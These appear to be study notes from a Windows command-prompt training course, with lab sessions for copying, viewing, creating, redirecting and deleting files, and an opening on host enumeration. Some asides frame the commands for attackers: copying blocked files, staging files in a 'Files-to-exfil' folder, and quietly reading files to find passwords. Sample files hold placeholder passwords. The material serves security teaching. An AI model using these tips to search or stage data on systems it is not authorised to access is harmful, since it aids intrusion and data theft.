The syntax for `xcopy` is `xcopy source destination options`. 

As well as with move, we can use wildcards for source files, not destination files.
#### Using `xcopy`

```cmd
C:\Users\htb\Desktop> xcopy C:\Users\htb\Documents\example C:\Users\htb\Desktop\ /E

C:\Users\htb\Documents\example\file-1 - Copy.txt
C:\Users\htb\Documents\example\file-1.txt
C:\Users\htb\Documents\example\file-2.txt
C:\Users\htb\Documents\example\file-3.txt
C:\Users\htb\Documents\example\file-5.txt
C:\Users\htb\Documents\example\‎file-4.txt
6 File(s) copied
```

> Xcopy prompts us during the process and displays the result. In our case, the directory and any files within were copied to the desktop. 

Utilizing the `/E` switch, we told Xcopy to copy any files and subdirectories to include empty directories. Keep in mind this will not delete the copy in the previous directory.

When performing the duplication, xcopy will reset any attributes the file had. If you wish to retain the files attributes (such as read-only or hidden), you can use the `/K` switch.

> From hacker's perspective, `xcopy` can be very helpful. If we wish to move a file, even a system file, or something blocked, xcopy can do this without adding other tools to the host. 
> 
> 	As a defender, this is a great way to grab a copy of a file and retain the same state for analysis. For example, you wish to grab a read-only file that was transferred in from a CD or flash drive, and you now suspect it of performing suspicious actions.

**`Robocopy`** is xcopy's successor built with much more capability. We can think of Robocopy as merging the best parts of copy, xcopy, and move spiced up with a few extra capabilities. 

Robocopy can copy and move files locally, to different drives, and even across a network while retaining the file data and attributes to include:

- Timestamps
- Ownership
- ACLs
- Any flags set like hidden or read-only

We need to be aware that Robocopy was made for large directories and drive syncing, so it does not like to copy or move singular files by default.

- That is not to say that it is incapable, however. We will cover a bit of that down below.
#### Robocopy Basic

```cmd
C:\Users\htb\Desktop> robocopy C:\Users\htb\Desktop C:\Users\htb\Documents\

robocopy C:\Users\htb\Desktop C:\Users\htb\Documents

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Monday, June 21, 2021 11:05:46 AM
   Source : C:\Users\htb\Desktop\
     Dest : C:\Users\htb\Documents\

    Files : *.*

  Options : *.* /DCOPY:DA /COPY:DAT /R:1000000 /W:30

------------------------------------------------------------------------------

                           7    C:\Users\htb\Desktop\
        *EXTRA Dir        -1    C:\Users\htb\Documents\My Music\
        *EXTRA Dir        -1    C:\Users\htb\Documents\My Pictures\
        *EXTRA Dir        -1    C:\Users\htb\Documents\My Videos\
100%        Older                    282        desktop.ini
100%        New File                  19        file.txt
100%        New File                  26        normal-file.txt
100%        New File                  97        passwords.txt
100%        New File                  97        Project plans.txt
100%        New File                 114        secrets.txt
100%        New File               38380        Windows Startup.wav

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         3
   Files :         7         7         0         0         0         0
   Bytes :    38.1 k    38.1 k         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :              619285 Bytes/sec.
   Speed :              35.435 MegaBytes/min.
   Ended : Monday, June 21, 2021 11:05:46 AM


C:\Users\htb\Desktop>dir C:\Users\htb\Documents
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Documents

06/21/2021  11:05 AM    <DIR>          .
06/21/2021  11:05 AM    <DIR>          ..
06/14/2021  10:37 PM                19 file.txt
06/14/2021  10:59 PM                26 normal-file.txt
06/14/2021  10:28 PM                97 passwords.txt
06/14/2021  10:34 PM                97 Project plans.txt
06/14/2021  08:38 PM               114 secrets.txt
12/07/2019  05:08 AM            38,380 Windows Startup.wav
               6 File(s)         38,733 bytes
               2 Dir(s)  38,285,684,736 bytes free
```

> Robocopy took everything in our Desktop directory and made a copy of it in the Documents directory. This works without any issues because we have permission to copy over the folder currently. 

As discussed earlier, Robocopy can work with system, read only, and hidden files. 

As a user, this can be problematic if we do not have the `SeBackupPrivilege` and `auditing privilege` attributes.
	This could stop us from duplicating or moving files and directories
	There is a bit of a *workaround*, however:
		We can utilize the `/MIR` switch to permit ourselves to copy the files we need temporarily. 
#### Robocopy Backup Mode Fail

```cmd
C:\Users\htb\Desktop> robocopy /E /B /L C:\Users\htb\Desktop\example C:\Users\htb\Documents\Backup\

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows                    
-------------------------------------------------------------------------------

  Started : Monday, June 21, 2021 10:03:56 PM
   Source : C:\Users\htb\Desktop\example\
     Dest : C:\Users\htb\Documents\Backup\

    Files : *.*

  Options : *.* /L /S /E /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

ERROR : You do not have the Backup and Restore Files user rights.
*****  You need these to perform Backup copies (/B or /ZB).

ERROR : Robocopy ran out of memory, exiting.
ERROR : Invalid Parameter #%d : "%s"

ERROR : Invalid Job File, Line #%d :"%s"


  Started : %s %s

   Source %c

     Dest %c
       Simple Usage :: ROBOCOPY source destination /MIR

             source :: Source Directory (drive:\path or \\server\share\path).
        destination :: Destination Dir  (drive:\path or \\server\share\path).
               /MIR :: Mirror a complete directory tree.

    For more usage information run ROBOCOPY /?


****  /MIR can DELETE files as well as copy them !
```

> From the output above, we can see that our permissions are insufficient. Utilizing the /MIR switch will complete the task for us. Be aware that it will mark the files as a system backup and *hide them from view.*

We can clear the additional attributes if we add the `/A=:SH` switch to our command. 

Be careful on the `/MIR` switch, as it will mirror the destination directory to the source. Any file that exists within the destination will be removed. 
	Ensure you place the new copy in a *cleared folder.* 

Above, we also used the `/L` switch. This is a **what-if** command. It will process the command you issue but not execute it; it just shows you the potential result. 
#### Robocopy /MIR

```cmd
C:\Users\htb\Desktop> robocopy /E /MIR /A-:SH C:\Users\htb\Desktop\notes\ C:\Users\htb\Documents\Backup\Files-to-exfil\

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows                    
-------------------------------------------------------------------------------

  Started : Monday, June 21, 2021 10:45:46 PM
   Source : C:\Users\htb\Desktop\notes\
     Dest : C:\Users\htb\Documents\Backup\Files-to-exfil\

    Files : *.*

  Options : *.* /S /E /DCOPY:DA /COPY:DAT /PURGE /MIR /A-:SH /R:1000000 /W:30

------------------------------------------------------------------------------

                           2    C:\Users\htb\Desktop\notes\
100%        New File                  16        python-notes
100%        New File                  13        vscode

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         2         2         0         0         0         0
   Bytes :        29        29         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Monday, June 21, 2021 10:45:46 PM


C:\Users\htb\Documents\Backup\Files-to-exfil>dir
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Documents\Backup\Files-to-exfil

06/21/2021  10:45 PM    <DIR>          .
06/21/2021  10:45 PM    <DIR>          ..
06/15/2021  09:29 PM                16 python-notes
06/15/2021  09:28 PM                13 vscode
               2 File(s)             29 bytes
               2 Dir(s)  38,285,676,544 bytes free
```

> Running our command and then checking the directory shows us that the files copied over successfully. There are so many ways we can utilize Robocopy that it needs its own section. Experiment and play with the tool to develop some of your ways to move directories, copy files and even play with attributes.
### Files

> Many of the same commands we utilized while administering directories can also be used with files. Windows has plenty more built-in tools we can use for all our file magic fun. We will cover a few of them here. We should first discuss how to view files and their contents.
#### List Files and View Their Contents

> We already know we can utilize the `dir` command to view the files within a directory, along with specific information about them, depending on the switches we use. 

It is often the easiest way to see what files exist within a directory. 
	We also have the `tree /F` command to show us an output containing all directories and files within the tree. 
	Nevertheless, what if we wish to view the contents of a file? We can utilize the `more`, `openfiles` and `type` commands. 

First up is `more`. 

- With this built in tool, we can view the contents of a file or the results of another command printed to it one screen at a time. 
- Think of it as a way to buffer scrolling text that may otherwise overflow the terminal buffer.
#### More

```cmd
C:\Users\htb\Documents\Backup> more secrets.txt

The TVA has several copies of the Infinity Stones..


Bucky is a good guy. TWS is a Bo$$


The sky isn't blue..


-- More (6%) --
```

> Notice at the bottom of the cmd-session shows us the ***percentage of the file being viewed.*** 

As we hit enter or space bar, it will scroll the document's text for us, showing an increasing amount of the file in view. 

With large files containing multiple blank lines or a large amount of empty space between the data, we can use the `/S` option to crunch that blank space down to a single line at each point to make it easier to view. 

- This will not modify the file, just like the `more` command outputs blank space.
#### More /S

```cmd
C:\Users\htb\Documents\Backup> more /S secrets.txt

The TVA has several copies of the Infinity Stones..

Bucky is a good guy. TWS is a Bo$$

The sky isn't blue..

Windows IP Configuration

   Host Name . . . . . . . . . . . . : DESKTOP-LSM3BSF
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : lan

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : lan
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-0C-29-D7-67-BF
-- More (27%) --
```

> Notice how we have much more of the file in our first window view. More took a large amount of blank space and compressed it.
#### Sending a Command Output to More

```cmd
C:\Users\htb\> ipconfig /all | more

Windows IP Configuration

   Host Name . . . . . . . . . . . . : DESKTOP-LSM3BSF
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : lan

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : lan
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-0C-29-D7-67-BF
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::59fe:9ed2:fea6:1371%5(Preferred)
   IPv4 Address. . . . . . . . . . . : 172.16.146.5(Preferred)
-- More  --
```

> In the above output, we issued the `ipconfig /all` command which generally outputs a bunch of data, and piped (`|`) through `more` to slow it down.
> 
> 	This is especially handy when dealing with large files or commands that generate a lot of text, such as `systeminfo`

With `openfiles`, we can see what file on our local pc or a remote host has open and from which user. This command *requires administrator privileges on the host* you are trying to view. 

- With this tool, we can view open files, disconnect open files, and even kick users from accessing specific files. 
- The ability to use this command is *not enabled by default* on Windows systems. 

`Type` can display the contents of multiple text files at once. 

- It is also possible to utilize file redirection with type as well. It is a simple tool but extremely handy. One interesting thing about type is that it will *not lock files, so there is no worry of messing something up.*
#### Type

```cmd
C:\Users\htb\Desktop>type bio.txt

James Buchanan "Bucky" Barnes Jr. is a fictional character appearing in American comic books published by Marvel Comics. Originally introduced as a sidekick to Captain America, the character was created by Joe Simon and Jack Kirby and first appeared in Captain America Comics #1 (cover-dated March 1941) (which was published by Marvel's predecessor, Timely Comics). Barnes' original costume (or one based on it) and the Bucky nickname have been used by other superheroes in the Marvel Universe over the years.[1] The character is brought back from supposed death as the brainwashed assassin cyborg called Winter Soldier (Russian: ╨ù╨╕╨╝╨╜╨╕╨╣ ╨í╨╛╨╗╨┤╨░╤é, translit. Zimniy Sold├ít). The character's memories and personality are later restored, leading him to become a dark hero in search of redemption. He temporarily assumes the role of "Captain America" when Steve Rogers was presumed to be dead. During the 2011 crossover Fear Itself, Barnes is injected with the Infinity Formula, which increases his natural vitality and physical traits in a way that is similar to (but less powerful than) the super-soldier serum used on Captain America.[2]
```

> That is all there is to it. `type` provides Simple file output. We can also use it send output to another file. This can be a quick way to write a new file or append data to another file.
#### Redirect with Type

```cmd
C:\Users\htb\Desktop>type passwords.txt >> secrets.txt

C:\Users\htb\Desktop>type secrets.txt

The TVA has several copies of the Infinity Stones..
Bucky is a good guy. TWS is a Bo$$
The sky isn't blue..
" so many passwords in the file.. "
Password P@ssw0rd Super$ecr3t Admin @dmin123 Summer2021!
```

> With the example above, we appended the passwords.txt file to the end of the secrets.txt file with `>>`. Then we viewed the contents of secrets.txt and can see our data was successfully added.

We have been discussing a relatively simple topic, but it is a crucial part of any administrator or hacker's job. 

- Utilizing built-in tools such as `type` or `more` to poke around in a host filesystem is a quick and reasonably unnoticeable way to look for passwords, company rosters, or other potential sensitive information.
### Create and Modify a File

> Creating and modifying a file from the command line is relatively easy. We have several options that include `echo`, `fsutil`, `ren`, `rename` and `replace`. 

First, `echo` with output redirection allows us to modify a file if it already exists or create a new file at the time of the call.
#### Echo to Create and Append Files

```cmd
C:\Users\htb\Desktop>echo Check out this text > demo.txt

C:\Users\htb\Desktop>type demo.txt
Check out this text

C:\Users\htb\Desktop>echo More text for our demo file >> demo.txt

C:\Users\htb\Desktop>type demo.txt
Check out this text
More text for our demo file
```

> With `fsutil`, we can do many things, but in this instance, we will use it to create a file.

#### Fsutil to Create a File

```cmd
C:\Users\htb\Desktop>fsutil file createNew for-sure.txt 222
File C:\Users\htb\Desktop\for-sure.txt is created

C:\Users\htb\Desktop>echo " my super cool text file from fsutil "> for-sure.txt

C:\Users\htb\Desktop>type for-sure.txt
" my super cool text file from fsutil "
```

> `Ren` allows us to change the name of a file to something new.
#### Ren(ame) A File

```cmd
C:\Users\htb\Desktop> ren demo.txt superdemo.txt

C:\Users\htb\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop

06/22/2021  04:25 PM    <DIR>          .
06/22/2021  04:25 PM    <DIR>          ..
06/22/2021  03:21 PM             1,140 bio.txt
06/16/2021  02:36 PM    <DIR>          example
06/14/2021  10:37 PM                19 file.txt
06/22/2021  04:12 PM                41 for-sure.txt
06/22/2021  03:59 PM                12 maybe.txt
06/15/2021  10:26 PM    <DIR>          new-directory
06/22/2021  03:48 PM                 9 nono.txt
06/14/2021  10:59 PM                26 normal-file.txt
06/15/2021  09:29 PM    <DIR>          Notes
06/14/2021  10:28 PM                97 passwords.txt
06/14/2021  10:34 PM                97 Project plans.txt
06/22/2021  03:24 PM               211 secrets.txt
06/22/2021  04:14 PM                52 superdemo.txt
06/22/2021  03:18 PM             2,534 type.txt
06/21/2021  11:33 AM                 0 why-tho.txt
12/07/2019  05:08 AM            38,380 Windows Startup.wav
06/15/2021  09:29 PM    <DIR>          Work-Policies
06/15/2021  10:28 PM    <DIR>          yet-another-dir
              13 File(s)         42,618 bytes
               7 Dir(s)  39,091,531,776 bytes free
```

> We utilized `ren` to change the name of demo.txt to superdemo.txt. It can be issued as `ren` or rename. They are links to the same basic command.
### Input/Output

> We have seen this a few times already, but let us take a minute to talk about `I/O`. 
> 
> 	We can utilize the `<`, `>`, `|` and `&` to send input and output from the console and files to where we need them. 
> 	With `>` we can "push" the output of a command to a file.
#### Output to a File

```cmd
C:\Users\htb\Documents>dir
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Documents

06/23/2021  02:44 PM    <DIR>          .
06/23/2021  02:44 PM    <DIR>          ..
06/21/2021  10:38 PM    <DIR>          Backup
06/14/2021  10:34 PM                97 Project plans.txt
06/14/2021  08:38 PM               114 secrets.txt
               2 File(s)            211 bytes
               3 Dir(s)  39,028,850,688 bytes free

C:\Users\htb\Documents>ipconfig /all > details.txt

C:\Users\htb\Documents>dir
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Documents

06/23/2021  02:44 PM    <DIR>          .
06/23/2021  02:44 PM    <DIR>          ..
06/21/2021  10:38 PM    <DIR>          Backup
06/23/2021  02:44 PM             1,813 details.txt
06/14/2021  10:34 PM                97 Project plans.txt
06/14/2021  08:38 PM               114 secrets.txt
               3 File(s)          2,024 bytes
               3 Dir(s)  39,028,760,576 bytes free

C:\Users\htb\Documents>type details.txt

Windows IP Configuration

   Host Name . . . . . . . . . . . . : DESKTOP-LSM3BSF
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : greenhorn.corp

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : greenhorn.corp
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-0C-29-D7-67-BF
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::59fe:9ed2:fea6:1371%8(Preferred)
   IPv4 Address. . . . . . . . . . . : 172.16.146.5(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Lease Obtained. . . . . . . . . . : Wednesday, June 23, 2021 2:42:19 PM
   Lease Expires . . . . . . . . . . : Thursday, June 24, 2021 2:27:59 PM
   Default Gateway . . . . . . . . . : 172.16.146.1
```

> Looking above, we can see that the output from `ipconfig /all` command was pushed to `details.txt`. When we check the file, we see when it was created, and the content's output successfully inside. 

Using `>` this way will create the file if it does not exist, or it will overwrite the specified file's contents. 

- To append to an already populated file, we can utilize `>>`. 
#### Append to a File

```cmd
C:\Users\htb\Documents> echo a b c d e > test.txt

C:\Users\htb\Documents>type test.txt
a b c d e

C:\Users\htb\Documents>echo f g h i j k see how this works now? >> test.txt

C:\Users\htb\Documents>type test.txt
a b c d e
f g h i j k see how this works now?
```

> We created the test.txt file with a string, then appended our following line (f g h i j k see how this works now?) to the file with `>>`.

We were feeding input from a command out before; let us feed input into a command now. We will accomplish that with `<`.
#### Pass in a Text File to a Command

```cmd
C:\Users\htb\Documents>find /i "see" < test.txt

f g h i j k see how this works now?
```

> In the session above, we took the contents of `test.txt` and fed it into our `find` command. 
> 	In this way, we were searching for the string `see`. We can see it kicked back the results by showing us *the line where it found `see`.*

These were fairly simple commands, but remember that we can use `<` like this to search for keywords or strings in large text files, sort for unique items, and much more. 

- This can be extremely helpful for us as a hacker looking for key information. 
- Another route we can take it to feed the output from a command directly into another command with the `|` called **pipe.**
#### Pipe Output Between Commands

```cmd
C:\Users\htb\Documents>ipconfig /all | find /i "IPV4"

   IPv4 Address. . . . . . . . . . . : 172.16.146.5(Preferred)
```

> With `pipe`, we could issue the command `ipconfig /all` and send it to `find` to search for a specific string. We know it worked because it returns our result in the following line. 
> 
> 	This effectively took our console output and redirected it to a new pipe.

*If you get this concept down, you can do endless things.* 

Let us say we wish to have two commands executed in succession. We can issue the command and follow it with `&` and then our next command. 

This will ensure that in this instance, our command `A` runs first then the session will run command `B`. 

- *It does not care if the command succeeded or failed. It just issues them.* 
#### Run A, Then B

```cmd
C:\Users\htb\Documents>ping 8.8.8.8 & type test.txt

Pinging 8.8.8.8 with 32 bytes of data:
Reply from 8.8.8.8: bytes=32 time=22ms TTL=114
Reply from 8.8.8.8: bytes=32 time=19ms TTL=114
Reply from 8.8.8.8: bytes=32 time=17ms TTL=114
Reply from 8.8.8.8: bytes=32 time=16ms TTL=114

Ping statistics for 8.8.8.8:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 16ms, Maximum = 22ms, Average = 18ms
a b c d e
f g h i j k see how this works now?
```

> If we care about the result or state of the commands being run, we can utilize `&&` to say run command A, and if it succeeds, run command B.
> 	This can be useful if you are doing something that is results dependent such as our cmd-session below.
#### State Dependent &&

```cmd
C:\Users\student\Documents>cd C:\Users\student\Documents\Backup && echo 'did this work' > yes.txt

C:\Users\student\Documents\Backup>type yes.txt
'did this work'
```

> We can see that on my first line with `&&`, we asked to change our working directory, then echo a string into a file if it succeeded. We can tell it succeeded because our cmd path changed and when we `type` the file, it echo'd our string into the file. You can also accomplish the opposite of this with `||`. 
> 
> 	By using `pipe pipe`, we are saying run command A, if it fails, run command B.
### Deleting Files

#### Dynamic Del and Erase

```cmd
C:\Users\htb\Desktop\example> dir

 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop\example

06/16/2021  02:00 PM    <DIR>          .
06/16/2021  02:00 PM    <DIR>          ..
06/16/2021  02:00 PM                 5 file-1
06/16/2021  02:00 PM                 5 file-2
06/16/2021  02:00 PM                 5 file-3
06/16/2021  02:00 PM                 5 file-4
06/16/2021  02:00 PM                 5 file-5
06/16/2021  02:00 PM                 5 file-6
06/16/2021  02:00 PM                 5 file-66
               7 File(s)             35 bytes
               2 Dir(s)  38,633,730,048 bytes free

C:\Users\htb\Desktop\example>del file-1

C:\Users\htb\Desktop\example>dir
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop\example

06/16/2021  02:03 PM    <DIR>          .
06/16/2021  02:03 PM    <DIR>          ..
06/16/2021  02:00 PM                 5 file-2
06/16/2021  02:00 PM                 5 file-3
06/16/2021  02:00 PM                 5 file-4
06/16/2021  02:00 PM                 5 file-5
06/16/2021  02:00 PM                 5 file-6
06/16/2021  02:00 PM                 5 file-66
               6 File(s)             30 bytes
               2 Dir(s)  38,633,730,048 bytes free
```

> When utilizing `del` or `erase`, remember that we can specify a directory, a filename, a list of names, or even a specific attribute to target when trying to delete files. 

Above, we listed the example directory and then deleted `file-1`. Simple enough right? Now let us erase a list of files.
#### Using Del and Erase to Remove a List of Files

```cmd
C:\Users\htb\Desktop\example> erase file-3 file-5

dir
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop\example

06/16/2021  02:06 PM    <DIR>          .
06/16/2021  02:06 PM    <DIR>          ..
06/16/2021  02:00 PM                 5 file-2
06/16/2021  02:00 PM                 5 file-4
06/16/2021  02:00 PM                 5 file-6
06/16/2021  02:00 PM                 5 file-66
               4 File(s)             20 bytes
               2 Dir(s)  38,633,218,048 bytes free
```

> We can see in the session above that we utilized erase instead of del this time. This was to show the interoperability of both commands. 

Think of them as *symbolic links*. Both commands do the same thing. This time we fed erase a list of two files, `file-3` and `file-5`. It erased the files without issue.

Let's say we want to get rid of a read-only or hidden file. We can do that with the `/A:` switch. /A can delete files based on a specific attribute.

Let us look at the help for `del` quickly and see what those attributes are.
#### Del Help Documentation

```cmd
C:\Users\htb\Desktop\example> help del

Deletes one or more files.

DEL [/P] [/F] [/S] [/Q] [/A[[:]attributes]] names
ERASE [/P] [/F] [/S] [/Q] [/A[[:]attributes]] names

  names         Specifies a list of one or more files or directories.
                Wildcards may be used to delete multiple files. If a
                directory is specified, all files within the directory
                will be deleted.

  /P            Prompts for confirmation before deleting each file.
  /F            Force deleting of read-only files.
  /S            Delete specified files from all subdirectories.
  /Q            Quiet mode, do not ask if ok to delete on global wildcard
  /A            Selects files to delete based on attributes
  attributes    R  Read-only files            S  System files
                H  Hidden files               A  Files ready for archiving
                I  Not content indexed Files  L  Reparse Points
                O  Offline files              -  Prefix meaning not
```

> So, to delete a read-only file, we can use `A:R`. This will remove anything within our path that is read-only. 
> 
> However, how do we identify if a file is read only, hidden, or has some other attribute? Dir can come to the rescue again. Utilizing `dir A:R` will show us anything with the Read-only attribute. Let us give it a try.
#### View Files with the Read-Only Attribute

```cmd
C:\Users\htb\Desktop\example> dir /A:R
 
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop\example

06/16/2021  02:00 PM                 5 file-66
               1 File(s)              5 bytes
               0 Dir(s)  38,632,652,800 bytes free
```

Now we know one file matches our Read-only attribute in the example directory. Let us delete it.
#### Delete a Read Only-File

```cmd
C:\Users\htb\Desktop\example > del /A:R *

C:\Users\htb\Desktop\example\*, Are you sure (Y/N)? Y

C:\Users\htb\Desktop\example>dir
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop\example

06/16/2021  02:22 PM    <DIR>          .
06/16/2021  02:22 PM    <DIR>          ..
06/16/2021  02:00 PM                 5 file-2
06/16/2021  02:00 PM                 5 file-4
06/16/2021  02:00 PM                 5 file-6
               3 File(s)             15 bytes
               2 Dir(s)  38,632,529,920 bytes free
```

> Notice that we used `*` to specify any file. Now when we look at the example directory again, file-66 is missing, but files 2, 4 and 6 are still there. 

Let us give del a swing again with the hidden attribute. To identify if there are any hidden files within the directory, we can use `dir /A:H`.
#### Viewing Hidden Files

```cmd
C:\Users\htb\Desktop\example> dir /A:H
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop\example

06/16/2021  02:00 PM                 5 file-99
               1 File(s)              5 bytes
               0 Dir(s)  38,632,202,240 bytes free
```

> Notice the new file we did not see before? Now `file-99` is showing up in our directory listing hidden files. 
> 
> 	Remember that much like Linux, you can hide files from the view of users. 
> 	With the hidden attribute, the file exists and can be called, but it *will not be visible within a directory listing or from the GUI unless specifically looking for them.*

To delete the hidden file, we can perform the same del command as earlier, just changing the attribute from `R` to `H`.
#### Removing Hidden Files

```cmd
C:\Users\htb\Desktop\example>dir /A:H
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop\example

06/16/2021  02:00 PM                 5 file-99
               1 File(s)              5 bytes
               0 Dir(s)  38,632,202,240 bytes free

C:\Users\htb\Desktop\example>del /A:H *
C:\Users\htb\Desktop\example\*, Are you sure (Y/N)? Y

C:\Users\htb\Desktop\example>dir
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop\example

06/16/2021  02:28 PM    <DIR>          .
06/16/2021  02:28 PM    <DIR>          ..
06/16/2021  02:00 PM                 5 file-2
06/16/2021  02:00 PM                 5 file-4
06/16/2021  02:00 PM                 5 file-6
               3 File(s)             15 bytes
               2 Dir(s)  38,631,997,440 bytes free

C:\Users\htb\Desktop\example>dir /A:H
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop\example

File Not Found
```

> Now we have successfully deleted a file with the hidden attribute. To erase the directory with the rest of its contents, we can feed the `del` command with the directory name to remove the contents and follow it up with the `rd` command to eliminate the directory structure.

If a file reside within the directory with the Read-only attribute or some other, utilizing the `/F` switch will force delete the file.

### Copying and Moving Files

> Just like directories, we have several options to copy or move files. `Copy` and `move` are the easiest ways to accomplish this. We can use them to make copies of a file in the same directory or move it to another. 

*As a task, this is one of the simplest we will do.* 
#### copy

```cmd
C:\Users\student\Documents\Backup>copy secrets.txt C:\Users\student\Downloads\not-secrets.txt
        
        1 file(s) copied.
C:\Users\student\Downloads>dir
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\student\Downloads

06/23/2021  10:35 PM    <DIR>          .
06/23/2021  10:35 PM    <DIR>          ..
06/21/2021  11:58 PM             2,418 not-secrets.txt
               1 File(s)          2,418 bytes
               2 Dir(s)  39,021,146,112 bytes free
```

> We copied `secrets.txt` and moved it to the downloads folder, renamed it as `not-secrets.txt`

> By default, `copy` will complete its task and close. If we wish to ensure the files copied correctly, we can use the `/V` switch to turn on ***file validation.***
#### Copy Validation

```cmd
C:\Windows\System32> copy calc.exe C:\Users\student\Downloads\copied-calc.exe /V
Overwrite C:\Users\student\Downloads\copied-calc.exe? (Yes/No/All): A
        1 file(s) copied.
```

> With `move`, we can move files and directories from one place to another and rename them. Move differs from copy because it can also rename and move directories.
#### move

```cmd
C:\Users\student\Desktop>move C:\Users\student\Desktop\bio.txt C:\Users\student\Downloads
        
        1 file(s) moved.

C:\Users\student\Desktop>dir C:\Users\student\Downloads
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\student\Downloads

06/24/2021  11:10 AM    <DIR>          .
06/24/2021  11:10 AM    <DIR>          ..
06/22/2021  03:21 PM             1,140 bio.txt
12/07/2019  05:09 AM            27,648 copied-calc.exe
06/21/2021  11:58 PM             2,418 not-secrets.txt
               3 File(s)         31,206 bytes
               2 Dir(s)  39,122,550,784 bytes free
```

> In the above session, we took `bio.txt` and moved it to the Downloads folder. Manipulating files is as easy as that. 
# Gathering System Information

> Now that we are familiar with navigating our Windows host using nothing but the Command Prompt let us move on to a fundamental concept accessible to both `System Administrators` and `Penetration Testers`: **`Gathering System Information`**

Gathering `system information` (aka `host enumeration`) may seem daunting at first, however, it is a crucial step in providing a good foundation for getting to know our environment. 

Learning the environment and getting a general feel for our surroundings is beneficial to both sides of the aisle, benefitting the `red team` and `blue team`.

Those seated on the `red team`, (Penetration Testers, Red Team Operators, Hackers, etc.) will find value in being able to scan their hosts and the environment to learn what vulnerable services and machines are deployed and can be exploited.

Whereas the `blue team` (System Admins, SOC Analysts, etc.) can use the informaiton to diagnose issues, secure hosts and services, and ensure integrity across the network. 

> Regardless of which team we might find ourselves most interested in or currently involved in, this section aims to provide the following information:
> 
> 	- What information can we gather from the system?
> 	- Why do we need this information, and what is the importance of throrough enumeration?
> 	- How to we get this information via command prompt, and what general methodology should we follow?
### What Types of Information Can We Gather from the System?

> Once we have initial access to the system through some `command shell`, just knowing where to begin searching the system for information can be difficult. 
> 
> Manually `enumerating` the system with no path in mind on how we wish to proceed can lead to plenty of lost hours searching through troves of what seems to be important information with little to no results to show for all of that time spent.

The goal of `host enumeration` is to provide an overall picture of the target host, its environment, and how it interacts with other systems across the network. 

Keeping that in mind, the first question we might find ourselves coming to is:

## **`How do we know what to look for?`**

> To answer our question, we need to have a basic understanding of all the different types of information available to us on a system. 

Below is a chart that we can reference to give us a generalized outline of the main types of information we need to be aware of while performing host enumeration.

> The types of information we are looking for can be broken down into the following categories:

| Type                         | Description                                                                                                                                                                                                                                                                                                                                             |
| ---------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `General System Information` | Contains information about the overall target system. Target system information includes but is not limited to the `hostname` of the machine, OS-specific details (`name`, `version`, `configuration`, etc.) and `installed hotfixes/patches` for the system                                                                                            |
